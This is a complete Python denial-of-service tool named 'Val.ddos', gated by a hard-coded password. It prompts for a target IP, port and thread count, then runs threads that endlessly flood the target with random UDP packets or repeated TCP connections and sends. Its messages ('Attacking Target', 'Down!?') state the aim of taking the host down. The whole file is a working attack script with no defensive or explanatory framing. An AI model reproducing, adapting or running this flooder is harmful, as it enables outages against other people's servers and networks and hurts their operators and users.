#Val.ddos

import random
import socket
import threading
import os
import time

K = '\033[93m'
U = '\033[95m'
C = '\033[94m'
R = '\033[91m'
H = '\033[92m'

os.system("clear")
password = input(K+"[+] Password : ")
if password == "toolsval":
    print("correct password")
    time.sleep(2)
else :
    print("Password wrong")
    time.sleep(1000)
    
os.system("clear")

print("Val. Ddos")
ip = str(input(" Ip Target: "))
port = int(input(" Port Target: "))
choice = str(input(" Ready? (y/n): "))
times = int(input(" Faket: "))
threads = int(input(" Threads: "))
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" Sending...")
    except:
      print(R+"[!] Sending...")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" Attacking Target")
    except:
      s.close()
      print(H+"[X] Down!?")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()